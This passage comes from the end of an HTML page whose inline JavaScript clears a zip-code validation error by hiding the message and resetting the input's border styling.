            zipInput.classList.remove('border-gray-300');
        }

        function clearZipError() {
            const zipError = document.getElementById('zipError');
            const zipInput = document.getElementById('zipCode');
            
            zipError.classList.add('hidden');
            zipInput.classList.remove('border-red-500');
            zipInput.classList.add('border-gray-300');
        }
    </script>
</body>
</html>
